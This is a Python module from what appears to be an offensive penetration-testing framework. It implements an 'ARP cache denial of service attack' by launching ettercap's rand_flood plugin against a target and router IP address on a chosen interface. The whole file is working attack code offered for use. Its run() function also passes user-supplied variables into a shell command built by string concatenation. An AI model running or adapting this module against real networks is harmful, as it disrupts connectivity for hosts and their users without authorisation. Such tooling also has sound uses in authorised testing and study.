#        Copyright (C) 2015 Noa-Emil Nissinen (4shadoww)
import sys
from core import bcolors
import subprocess
from time import sleep
from collections import OrderedDict
import os

#info about module
#modules name (must be same as filename)
modulename = "arp_dos"
#module version
version = "1.0"
#description
desc = "ARP cache denial of service attack"
#creator's github
github = "4shadoww"
#created by (creators name)
createdby = "4shadoww"
#email
email = "4shadoww0@gmail.com"
#alert user if root permissions not available (remove variable below if root permissions needed)
needroot = 1

#list of variables
variables = OrderedDict((
('target', '192.168.1.2'),
('router', '192.168.1.1'),
('interface', 'eth0'),
))

#description for variables
vdesc = [
'target ip address',
'router ip address',
'network interface name',
]

#additional help notes
help_notes = bcolors.WARNING+"This module will not work without root permissions!"+bcolors.END

#simple changelog
changelog = "Version 1.0:\nrelease"

def run():
	print(bcolors.BOLD + bcolors.OKBLUE + "[*]attack has been started ..." + bcolors.END)
	command = 'xterm -e ettercap -i '+ variables['interface'] + ' -Tq -P rand_flood ' + '/'+variables['router']+'//' + ' ' + '/'+variables['target']+'//'
	subprocess.Popen(command, stderr=subprocess.PIPE, stdout=subprocess.PIPE, shell=True)
	line_4 = bcolors.OKBLUE+"for stop attack press [enter]"+bcolors.END
	fin = input(line_4)
	os.system('killall ettercap')
	print(bcolors.BOLD + bcolors.OKGREEN + "[*]attack stoped" + bcolors.END)